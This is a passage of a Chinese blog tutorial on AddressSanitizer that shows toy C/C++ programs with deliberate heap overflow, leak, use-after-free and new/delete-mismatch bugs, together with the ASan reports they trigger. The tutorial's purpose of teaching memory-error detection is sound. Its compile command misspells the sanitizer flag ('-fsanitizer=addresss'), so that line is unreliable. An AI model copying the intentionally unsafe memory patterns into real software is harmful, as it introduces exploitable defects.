<code>poisoned</code></p><p>对于栈来说，redzones 的创建与染毒，是都在 runtime 发生的。</p><p><strong>错误及漏报</strong><br>比较具代表性的：<br>直接跨越了一个 redzone<br>即 a 分配了 500字节，a 右侧 redzone 大小为500 字节，b分配了 5000字节大小<br>若一个指针从 a 读取，偏移量达到1000，则很可能直接访问了b区的合法区域。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *a = new <span class="hljs-type">char</span>[<span class="hljs-number">100</span>];<br><br><span class="hljs-type">char</span> *b = new <span class="hljs-type">char</span>[<span class="hljs-number">1000</span>];<br><br>a[<span class="hljs-number">500</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// may end up somewhere in b</span><br></code></pre></td></tr></table></figure><h1 id="ASan-实际测试"><a href="#ASan-实际测试" class="headerlink" title="ASan 实际测试"></a>ASan 实际测试</h1><h2 id="堆越界"><a href="#堆越界" class="headerlink" title="堆越界"></a>堆越界</h2><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">char</span> *heap_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>        <span class="hljs-built_in">memcpy</span>(heap_buf+<span class="hljs-number">30</span>, <span class="hljs-string">&quot;overflow&quot;</span>, <span class="hljs-number">8</span>);    <span class="hljs-comment">//在heap_buf的第30个字节开始，拷贝8个字符</span><br><br>        <span class="hljs-built_in">free</span>(heap_buf);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，申请了32个字节，但是会访问至 base_addr + 37 字节处，来看看 asan 怎么处理</p><p>编译：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-fsanitizer</span>=addresss -fno-omit-frame-pointer -o test1 test1.c<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./test1<br></code></pre></td></tr></table></figure><p>以下是运行结果，即asan给出的错误信息</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs tap">=================================================================<br>==3905==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000060 at pc 0x7f09040c62c3 bp 0x7ffcf197b180 sp 0x7ffcf197a928<br>WRITE of size<span class="hljs-number"> 8 </span>at 0x603000000060 thread T0<br>    <span class="hljs-comment">#0 0x7f09040c62c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827</span><br>    <span class="hljs-comment">#1 0x5605f809b241 in main (/home/stre/Desktop/test1+0x1241)</span><br>    <span class="hljs-comment">#2 0x7f0903e91fcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br>    <span class="hljs-comment">#3 0x7f0903e9207c in __libc_start_main_impl ../csu/libc-start.c:409</span><br>    <span class="hljs-comment">#4 0x5605f809b144 in _start (/home/stre/Desktop/test1+0x1144)</span><br><br>0x603000000060 is located<span class="hljs-number"> 0 </span>bytes to the right of 32-byte region [0x603000000040,0x603000000060)<br>allocated by thread T0 here:<br>    <span class="hljs-comment">#0 0x7f0904140867 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145</span><br>    <span class="hljs-comment">#1 0x5605f809b21e in main (/home/stre/Desktop/test1+0x121e)</span><br>    <span class="hljs-comment">#2 0x7f0903e91fcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br><br>SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy<br>Shadow bytes around the buggy address:<br>  0x0c067fff7fb0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fc0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fd0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0c067fff8000: fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>fa fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[fa]fa fa fa<br>  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==3905==ABORTING<br></code></pre></td></tr></table></figure><p>其中：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">==<span class="hljs-number">3905</span>==ERROR: <span class="hljs-keyword">AddressSanitizer: </span>heap-<span class="hljs-keyword">buffer-overflow </span>on <span class="hljs-keyword">address </span><span class="hljs-number">0x603000000060</span> <span class="hljs-built_in">at</span> pc <span class="hljs-number">0x7f09040c62c3</span> <span class="hljs-keyword">bp </span><span class="hljs-number">0x7ffcf197b180</span> <span class="hljs-built_in">sp</span> <span class="hljs-number">0x7ffcf197a928</span><br>WRITE of size <span class="hljs-number">8</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x603000000060</span> thread <span class="hljs-built_in">T0</span><br></code></pre></td></tr></table></figure><p>这两行内容告诉用户，这是一个堆越界的 bug ，发生于地址 <code>0x603000000060</code> 处</p><p>接下来：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">0x603000000060</span> is located <span class="hljs-number">0</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> <span class="hljs-keyword">of</span> <span class="hljs-number">32</span>-<span class="hljs-keyword">byte</span> region [<span class="hljs-number">0x603000000040</span>,<span class="hljs-number">0x603000000060</span>)<br></code></pre></td></tr></table></figure><p>意思是，这个错误访问的地址，是 <code>32-byte region</code>的右侧，位于 <code>[0x603000000040,0x603000000060)</code>这个左闭右开的可访问区间的右端，位移为0处，即访问了右侧这个不可访问的地址。</p><p>接下来：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">SUMMARY: AddressSanitizer: heap-buffer-overflow ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span> <span class="hljs-keyword">in</span> __interceptor_memcpy<br></code></pre></td></tr></table></figure><p>总结：这是一个堆越界的错误，具体路径以及导致这个问题的函数被列出。</p><p>利用 shadow memory 的映射公式，可以计算</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x603000000060</span> &gt;&gt; <span class="hljs-number">3</span> + <span class="hljs-number">0</span>x7fff8000 = <span class="hljs-number">0</span>xc067fff800c<br></code></pre></td></tr></table></figure><p>而这个计算出的地址，正好对应下面列出的特别被圈出的地址</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">0x0c067fff7fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0c067fff8000: fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>fa fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[fa]fa fa fa<br>  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br></code></pre></td></tr></table></figure><p>即，该影子地址内存储的值为fa，即不可访问，但源程序进行了访问，故报错。</p><p>修改源代码，若仅前3个字节（即共32+3个字节是申请的内存空间）可访问，则此处报错是如何</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">  <span class="hljs-number">0</span>x0c087fff7<span class="hljs-symbol">ff0:</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>=&gt;<span class="hljs-number">0</span>x0c087f<span class="hljs-symbol">ff8000:</span> fa fa <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>[<span class="hljs-number">03</span>]fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c087f<span class="hljs-symbol">ff8010:</span> fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br></code></pre></td></tr></table></figure><p>很明显，此处存放的值为03，即前三个字节可访问</p><h2 id="内存泄露检测"><a href="#内存泄露检测" class="headerlink" title="内存泄露检测"></a>内存泄露检测</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// leak.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">strcpy</span>(s, <span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;string is: %s\n&quot;</span>, s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进行编译、运行后，会生成下述报告</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">==<span class="hljs-number">3528</span>==ERROR: LeakSanitizer: detected memory leaks<br><br>Direct leak of <span class="hljs-number">100</span> <span class="hljs-keyword">byte</span>(s) in <span class="hljs-number">1</span> object(s) allocated <span class="hljs-keyword">from</span>:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa9f49d0867 in __interceptor_malloc ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">145</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x55df42973225 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/</span>leak+<span class="hljs-number">0</span>x1225)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa9f4721fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>SUMMARY: AddressSanitizer: <span class="hljs-number">100</span> <span class="hljs-keyword">byte</span>(s) leaked in <span class="hljs-number">1</span> allocation(s).<br></code></pre></td></tr></table></figure><p>发现内存泄露<code>detected memory leaks</code><br>接下来打印了泄露的位置以及泄露空间的大小</p><h2 id="UAF（use-after-free）"><a href="#UAF（use-after-free）" class="headerlink" title="UAF（use after free）"></a>UAF（use after free）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">free</span>(s);<br>    <span class="hljs-built_in">strcpy</span>(s, <span class="hljs-string">&quot;Hello world!&quot;</span>);  <span class="hljs-comment">// use-after-free</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;string is: %s\n&quot;</span>, s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将指针 s 指向的空间释放后，又访问指向的空间。</p><p>以下是编译且运行后报错</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs gradle">=================================================================<br>==<span class="hljs-number">3573</span>==ERROR: AddressSanitizer: heap-use-after-free on address <span class="hljs-number">0</span>x60b0000000f0 at pc <span class="hljs-number">0</span>x7fa6785892c3 bp <span class="hljs-number">0</span>x7fff93446ed0 sp <span class="hljs-number">0</span>x7fff93446678<br><span class="hljs-keyword">WRITE</span> of <span class="hljs-keyword">size</span> <span class="hljs-number">13</span> at <span class="hljs-number">0</span>x60b0000000f0 thread T0<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa6785892c2 in __interceptor_memcpy ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025270 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1270)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br>    #<span class="hljs-number">3</span> <span class="hljs-number">0</span>x7fa67835507c in __libc_start_main_impl ..<span class="hljs-regexp">/csu/</span>libc-start.c:<span class="hljs-number">409</span><br>    #<span class="hljs-number">4</span> <span class="hljs-number">0</span>x5634c5025164 in _start (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1164)<br><br><span class="hljs-number">0</span>x60b0000000f0 is located <span class="hljs-number">0</span> bytes inside of <span class="hljs-number">100</span>-<span class="hljs-keyword">byte</span> region [<span class="hljs-number">0</span>x60b0000000f0,<span class="hljs-number">0</span>x60b000000154)<br>freed by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa678603517 in __interceptor_free ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">127</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025255 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1255)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>previously allocated by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa678603867 in __interceptor_malloc ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">145</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025245 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1245)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>SUMMARY: AddressSanitizer: heap-use-after-free ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span> in __interceptor_memcpy<br>Shadow bytes around the buggy address:<br>  <span class="hljs-number">0</span>x0c167fff7fc0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7fd0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7fe0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7ff0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff8000: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd<br>=&gt;<span class="hljs-number">0</span>x0c167fff8010: fd fd fd fd fd fa fa fa fa fa fa fa fa fa[fd]fd<br>  <span class="hljs-number">0</span>x0c167fff8020: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow <span class="hljs-keyword">byte</span> legend (one shadow <span class="hljs-keyword">byte</span> represents <span class="hljs-number">8</span> application bytes):<br>  Addressable:           <span class="hljs-number">00</span><br>  Partially addressable: <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> <span class="hljs-number">05</span> <span class="hljs-number">06</span> <span class="hljs-number">07</span> <br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after <span class="hljs-keyword">return</span>:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==<span class="hljs-number">3573</span>==ABORTING<br></code></pre></td></tr></table></figure><p>asan 明确地指出了发生错误及地址是<code>AddressSanitizer: heap-use-after-free on address 0x60b0000000f0 </code></p><p>这个地址是在被释放的区域内<code>0x60b0000000f0 is located 0 bytes inside of 100-byte region [0x60b0000000f0,0x60b000000154)freed by thread T0 here</code></p><h2 id="分配释放不匹配"><a href="#分配释放不匹配" class="headerlink" title="分配释放不匹配"></a>分配释放不匹配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// bad_delete.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *cstr = new <span class="hljs-type">char</span>[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">strcpy</span>(cstr, <span class="hljs-string">&quot;Hello World&quot;</span>);<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; cstr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><br>    delete cstr;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该程序分配内存时使用的是<code>new[]</code>而释放时使用的不是<code>delete[]</code>，造成释放不完全。</p><p>其错误信息是</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span 